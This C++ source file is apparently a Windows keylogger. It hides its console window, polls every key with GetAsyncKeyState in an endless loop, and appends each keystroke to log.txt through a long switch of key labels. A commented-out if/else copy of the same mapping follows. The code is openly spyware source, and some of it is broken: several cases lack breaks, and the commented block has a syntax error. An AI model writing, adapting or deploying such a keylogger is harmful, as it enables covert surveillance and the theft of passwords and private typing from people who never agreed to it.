#include <iostream>
#include <windows.h>
#include <string>
using std::string;
using namespace std;

int saveKeys(int _key, char const *file);

int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	
	char i;

	while(true) {
		Sleep(10);
		for(i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				/*GetActiveWindowTitle();*/
				saveKeys(i, "log.txt");
			}
		}
	}
	return 0;
}

/*string GetActiveWindowTitle() {
 char wnd_title[256];
 HWND hwnd=GetForegroundWindow(); // get handle of currently active window
 GetWindowText(hwnd,wnd_title,sizeof(wnd_title));
 return wnd_title;
}*/


int saveKeys(int _key, char const *file) {
	cout << _key << endl;

	Sleep(10);

	FILE *OUTPUT_FILE;

	OUTPUT_FILE = fopen(file, "a+");
	
	switch(_key) {
  case VK_SHIFT: fprintf(OUTPUT_FILE, "%s", "[Shift]"); break;
  case VK_BACK: fprintf(OUTPUT_FILE, "%s", "[Backspace]"); break;
  case VK_LBUTTON: fprintf(OUTPUT_FILE, "%s", "[LMouse]"); break;
  case VK_RETURN: fprintf(OUTPUT_FILE, "%s", "[Enter]"); break;
  case VK_ESCAPE: fprintf(OUTPUT_FILE, "%s", "[Escape]"); break;
  case VK_MBUTTON: fprintf(OUTPUT_FILE, "%s", "[MMouse]"); break;
  case VK_TAB: fprintf(OUTPUT_FILE, "%s", "[Tab]"); break;
  case VK_CLEAR: fprintf(OUTPUT_FILE, "%s", "[Clear]");
  case VK_CONTROL: fprintf(OUTPUT_FILE, "%s", "[Control]");
  case VK_LMENU: fprintf(OUTPUT_FILE, "%s", "[LAlt]"); break;
  case VK_RMENU: fprintf(OUTPUT_FILE, "%s", "[RAlt]"); break;
  case VK_CAPITAL: fprintf(OUTPUT_FILE, "%s", "[Caps Lock]"); break;
  case VK_PRIOR: fprintf(OUTPUT_FILE, "%s", "[PgUp]"); break;
  case VK_NEXT: fprintf(OUTPUT_FILE, "%s", "[PgDwn]"); break;
  case VK_LEFT: fprintf(OUTPUT_FILE, "%s", "[Left Arrow]"); break;
  case VK_UP: fprintf(OUTPUT_FILE, "%s", "[Up Arrow]"); break;
  case VK_RIGHT: fprintf(OUTPUT_FILE, "%s", "[Right Arrow]"); break;
  case VK_DOWN: fprintf(OUTPUT_FILE, "%s", "[Down Arrow]"); break;
  case VK_SELECT: fprintf(OUTPUT_FILE, "%s", "[Select]"); break;
  case VK_PRINT: fprintf(OUTPUT_FILE, "%s", "[Print]"); break;
  case VK_SNAPSHOT: fprintf(OUTPUT_FILE, "%s", "[PrtScrn]"); break;
  case VK_INSERT: fprintf(OUTPUT_FILE, "%s", "[Insert]"); break;
  case VK_DELETE: fprintf(OUTPUT_FILE, "%s", "[Delete]"); break;
  case VK_HELP: fprintf(OUTPUT_FILE, "%s", "[Help]"); break;
  case VK_LWIN: fprintf(OUTPUT_FILE, "%s", "[LWin]"); break;
  case VK_RWIN: fprintf(OUTPUT_FILE, "%s", "[RWin]"); break;
  case VK_NUMPAD0: fprintf(OUTPUT_FILE, "%s", "[Num0]"); break;
  case VK_NUMPAD1: fprintf(OUTPUT_FILE, "%s", "[Num1]"); break;
  case VK_NUMPAD2: fprintf(OUTPUT_FILE, "%s", "[Num2]"); break;
  case VK_NUMPAD3: fprintf(OUTPUT_FILE, "%s", "[Num3]"); break;
  case VK_NUMPAD4: fprintf(OUTPUT_FILE, "%s", "[Num4]"); break;
  case VK_NUMPAD5: fprintf(OUTPUT_FILE, "%s", "[Num5]"); break;
  case VK_NUMPAD6: fprintf(OUTPUT_FILE, "%s", "[Num6]"); break;
  case VK_NUMPAD7: fprintf(OUTPUT_FILE, "%s", "[Num7]"); break;
  case VK_NUMPAD8: fprintf(OUTPUT_FILE, "%s", "[Num8]"); break;
  case VK_NUMPAD9: fprintf(OUTPUT_FILE, "%s", "[Num9]"); break;
  case VK_MULTIPLY: fprintf(OUTPUT_FILE, "%s", "[Num *]"); break;
  case VK_ADD: fprintf(OUTPUT_FILE, "%s", "[Num +]"); break;
  case VK_SEPARATOR: fprintf(OUTPUT_FILE, "%s", "[Separator]");
  case VK_SUBTRACT: fprintf(OUTPUT_FILE, "%s", "[Num -]"); break;
  case VK_DECIMAL: fprintf(OUTPUT_FILE, "%s", "[Num .]"); break;
  case VK_DIVIDE: fprintf(OUTPUT_FILE, "%s", "[Num /]"); break;
  case VK_F1: fprintf(OUTPUT_FILE, "%s", "[F1]"); break;
  case VK_F2: fprintf(OUTPUT_FILE, "%s", "[F2]"); break;
  case VK_F3: fprintf(OUTPUT_FILE, "%s", "[F3]"); break;
  case VK_F4: fprintf(OUTPUT_FILE, "%s", "[F4]"); break;
  case VK_F5: fprintf(OUTPUT_FILE, "%s", "[F5]"); break;
  case VK_F6: fprintf(OUTPUT_FILE, "%s", "[F6]"); break;
  case VK_F7: fprintf(OUTPUT_FILE, "%s", "[F7]"); break;
  case VK_F8: fprintf(OUTPUT_FILE, "%s", "[F8]"); break;
  case VK_F9: fprintf(OUTPUT_FILE, "%s", "[F9]"); break;
  case VK_F10: fprintf(OUTPUT_FILE, "%s", "[F10]"); break;
  case VK_F11: fprintf(OUTPUT_FILE, "%s", "[F11]"); break;
  case VK_F12: fprintf(OUTPUT_FILE, "%s", "[F12]"); break;
  case VK_F13: fprintf(OUTPUT_FILE, "%s", "[F13]"); break;
  case VK_F14: fprintf(OUTPUT_FILE, "%s", "[F14]"); break;
  case VK_F15: fprintf(OUTPUT_FILE, "%s", "[F15]"); break;
  case VK_F16: fprintf(OUTPUT_FILE, "%s", "[F16]"); break;
  case VK_NUMLOCK: fprintf(OUTPUT_FILE, "%s", "[NumLock]"); break;
  case VK_SCROLL: fprintf(OUTPUT_FILE, "%s", "[Scroll Lock]"); break;
  case VK_OEM_1: fprintf(OUTPUT_FILE, "%s", "[;:]"); break;
  case VK_OEM_COMMA: fprintf(OUTPUT_FILE, "%s", ","); break;
  case VK_OEM_MINUS: fprintf(OUTPUT_FILE, "%s", "[-_]"); break;
  case VK_OEM_PERIOD: fprintf(OUTPUT_FILE, "%s", "[>.]"); break;
  case VK_OEM_2: fprintf(OUTPUT_FILE, "%s", "[/?]"); break;
  case VK_OEM_3: fprintf(OUTPUT_FILE, "%s", "[`~]"); break;
  case VK_OEM_4: fprintf(OUTPUT_FILE, "%s", "[[{]"); break;
  case VK_OEM_5: fprintf(OUTPUT_FILE, "%s", "[\\|]"); break;
  case VK_OEM_6: fprintf(OUTPUT_FILE, "%s", "[]}]"); break;
  case VK_OEM_7: fprintf(OUTPUT_FILE, "%s", "[\"']"); break;
  case VK_OEM_8: fprintf(OUTPUT_FILE, "%s", "[§ !]"); break;
  case VK_OEM_102: fprintf(OUTPUT_FILE, "%s", "[<>]"); break;
  case VK_OEM_PLUS: fprintf(OUTPUT_FILE, "%s", "[+=]"); break;
  case VK_END: fprintf(OUTPUT_FILE, "%s", "[End]"); break;
  case VK_MENU: fprintf(OUTPUT_FILE, "%s", "[Alt]"); break;
	default: fprintf(OUTPUT_FILE, "%s", &_key);
	}
	fclose(OUTPUT_FILE);

	return 0;
}

	/*if(_key == VK_SHIFT) 
		fprintf(OUTPUT_FILE, "%s", "[Shift]");
	else if (_key == VK_BACK) 
		fprintf(OUTPUT_FILE, "%s", "[Backspace]");
	else if (_key == VK_LBUTTON) 
		fprintf(OUTPUT_FILE, "%s", "[LMouse]");
	else if (_key == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "[Enter]");
	else if (_key == VK_ESCAPE) 
		fprintf(OUTPUT_FILE, "%s", "[Escape]");
	else if (_key == VK_RBUTTON) 
		fprintf(OUTPUT_FILE, "%s", "[RMouse]");
	else if (_key == VK_MBUTTON) 
		fprintf(OUTPUT_FILE, "%s", "[MMouse]");
	else if (_key == VK_TAB) 
		fprintf(OUTPUT_FILE, "%s", "[Tab]");
	else if (_key == VK_CLEAR) 
		fprintf(OUTPUT_FILE, "%s", "[Clear]");    			
	else if (_key == VK_CONTROL) 
		fprintf(OUTPUT_FILE, "%s", "[Control]");
	else if (_key == VK_LMENU) 
		fprintf(OUTPUT_FILE, "%s", "[LAlt]");
	else if(_key == VK_RMENU) 
		fprintf(OUTPUT_FILE, "%s", "[RAlt]");
	else if(_key == VK_CAPITAL)
		fprintf(OUTPUT_FILE, "%s", "[Caps Lock]");
	else if(_key == VK_PRIOR)
		fprintf(OUTPUT_FILE, "%s", "[PgUp]");
	else if(_key == VK_NEXT)
		fprintf(OUTPUT_FILE, "%s", "[PgDwn]");
	else if(_key == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[Left Arrow]");
	else if(_key == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[Up Arrow]");
	else if(_key == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[Right Arrow]");
	else if(_key == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[Down Arrow]");
	else if(_key == VK_SELECT)
		fprintf(OUTPUT_FILE, "%s", "[Select]");
	else if(_key == VK_PRINT)
		fprintf(OUTPUT_FILE, "%s", "[Print]");
	else if(_key == VK_SNAPSHOT)
		fprintf(OUTPUT_FILE, "%s", "[PrtScrn]");
	else if(_key == VK_INSERT
		fprintf(OUTPUT_FILE, "%s", "[Insert]");
	else if(_key == VK_DELETE)
		fprintf(OUTPUT_FILE, "%s", "[Delete]");
	else if(_key == VK_HELP)
		fprintf(OUTPUT_FILE, "%s", "[Help]");
	else if(_key == VK_LWIN)
		fprintf(OUTPUT_FILE, "%s", "[LWin]");
	else if(_key == VK_RWIN)
		fprintf(OUTPUT_FILE, "%s", "[RWin]");
	else if(_key == VK_NUMPAD0)
		fprintf(OUTPUT_FILE, "%s", "[Num0]");
	else if(_key == VK_NUMPAD1)
		fprintf(OUTPUT_FILE, "%s", "[Num1]");
	else if(_key == VK_NUMPAD2)
		fprintf(OUTPUT_FILE, "%s", "[Num2]");
	else if(_key == VK_NUMPAD3)
		fprintf(OUTPUT_FILE, "%s", "[Num3]");
	else if(_key == VK_NUMPAD4)
		fprintf(OUTPUT_FILE, "%s", "[Num4]");
	else if(_key == VK_NUMPAD5)
		fprintf(OUTPUT_FILE, "%s", "[Num5]");
	else if(_key == VK_NUMPAD6)
		fprintf(OUTPUT_FILE, "%s", "[Num6]");
	else if(_key == VK_NUMPAD7)
		fprintf(OUTPUT_FILE, "%s", "[Num7]");
	else if(_key == VK_NUMPAD8)
		fprintf(OUTPUT_FILE, "%s", "[Num8]");
	else if(_key == VK_NUMPAD9)
		fprintf(OUTPUT_FILE, "%s", "[Num9]");
	else if(_key == VK_MULTIPLY)
		fprintf(OUTPUT_FILE, "%s", "[Num *]");
	else if(_key == VK_ADD)
		fprintf(OUTPUT_FILE, "%s", "[Num +]");
	else if(_key == VK_SEPARATOR)
		fprintf(OUTPUT_FILE, "%s", "[Separator]");
	else if(_key == VK_SUBTRACT)
		fprintf(OUTPUT_FILE, "%s", "[Num -]");
	else if(_key == VK_DECIMAL)
		fprintf(OUTPUT_FILE, "%s", "[Num .]");
	else if(_key == VK_DIVIDE)
		fprintf(OUTPUT_FILE, "%s", "[Num /]");
	else if(_key == VK_F1)
		fprintf(OUTPUT_FILE, "%s", "[F1]");
	else if(_key == VK_F2)
		fprintf(OUTPUT_FILE, "%s", "[F2]");
	else if(_key == VK_F3)
		fprintf(OUTPUT_FILE, "%s", "[F3]");
	else if(_key == VK_F4)
		fprintf(OUTPUT_FILE, "%s", "[F4]");
	else if(_key == VK_F5)
		fprintf(OUTPUT_FILE, "%s", "[F5]");
	else if(_key == VK_F6)
		fprintf(OUTPUT_FILE, "%s", "[F6]");
	else if(_key == VK_F7)
		fprintf(OUTPUT_FILE, "%s", "[F7]");
	else if(_key == VK_F8)
		fprintf(OUTPUT_FILE, "%s", "[F8]");
	else if(_key == VK_F9)
		fprintf(OUTPUT_FILE, "%s", "[F9]");
	else if(_key == VK_F10)
		fprintf(OUTPUT_FILE, "%s", "[F10]");
	else if(_key == VK_F11)
		fprintf(OUTPUT_FILE, "%s", "[F11]");
	else if(_key == VK_F12)
		fprintf(OUTPUT_FILE, "%s", "[F12]");
	else if(_key == VK_F13)
		fprintf(OUTPUT_FILE, "%s", "[F13]");
	else if(_key == VK_F14)
		fprintf(OUTPUT_FILE, "%s", "[F14]");
	else if(_key == VK_F15)
		fprintf(OUTPUT_FILE, "%s", "[F15]");
	else if(_key == VK_F16)
		fprintf(OUTPUT_FILE, "%s", "[F16]");
	else if(_key == VK_NUMLOCK)
		fprintf(OUTPUT_FILE, "%s", "[NumLock]");
	else if(_key == VK_SCROLL)
		fprintf(OUTPUT_FILE, "%s", "[Scroll Lock]");
	else if(_key == VK_OEM_1)
		fprintf(OUTPUT_FILE, "%s", "[;:]");
	else if(_key == VK_OEM_COMMA)
		fprintf(OUTPUT_FILE, "%s", ",");
	else if(_key == VK_OEM_MINUS)
		fprintf(OUTPUT_FILE, "%s", "[-_]");
	else if(_key == VK_OEM_PERIOD)
		fprintf(OUTPUT_FILE, "%s", "[>.]");
	else if(_key == VK_OEM_2)
		fprintf(OUTPUT_FILE, "%s", "[/?]");
	else if(_key == VK_OEM_3)
		fprintf(OUTPUT_FILE, "%s", "[`~]");
	else if(_key == VK_OEM_4)
		fprintf(OUTPUT_FILE, "%s", "[[{]");
	else if(_key == VK_OEM_5)
		fprintf(OUTPUT_FILE, "%s", "[\\|]");
	else if(_key == VK_OEM_6)
		fprintf(OUTPUT_FILE, "%s", "[]}]");
	else if(_key == VK_OEM_7)
		fprintf(OUTPUT_FILE, "%s", "[\"']");
	else if(_key == VK_OEM_8)
		fprintf(OUTPUT_FILE, "%s", "[§ !]");
	else if(_key == VK_OEM_102)
		fprintf(OUTPUT_FILE, "%s", "[<>]");
	else if(_key == VK_OEM_PLUS)
		fprintf(OUTPUT_FILE, "%s", "[+=]");
	else if(_key == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[End]");
	else if(_key == VK_MENU)
		fprintf(OUTPUT_FILE, "%s", "[Alt]");

	else
		fprintf(OUTPUT_FILE, "%s", &_key);*/